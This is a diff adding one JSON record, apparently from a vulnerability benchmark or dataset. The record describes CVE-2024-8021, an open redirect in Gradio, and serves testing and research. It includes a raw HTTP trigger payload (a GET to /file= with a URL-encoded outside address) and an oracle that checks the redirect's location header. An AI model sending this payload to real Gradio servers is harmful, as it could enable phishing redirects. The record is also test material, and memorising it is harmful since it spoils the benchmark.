@@ -1,0 +1,15 @@
+{
+  "file_id": "362_gradio_huntr_adc23067-ec04-47ef-9265-afd452071888",
+  "numeric_id": "362",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Open redirect vulnerability due to URL decoding in Gradio application",
+  "cve": "CVE-2024-8021",
+  "cwe": "CWE-601: Open Redirect",
+  "library": "gradio-app/gradio",
+  "affected_version": "Latest",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "GET /file=http%3A%2F%2Fgoogle.com HTTP/1.1\nHost: {BASE_URL}\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6,ml;q=0.5\nPriority: u=0, i\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US\nCookie: _ga_R1FN4KJKJH=GS1.1.17897865150.1.0.1714449150.0.0.0; _ga=GA1.1.1786736.81\nConnection: close",
+  "oracle": "Server redirects to the specified URL (e.g., http://google.com) as indicated by the 'location' header in the HTTP response."
+}
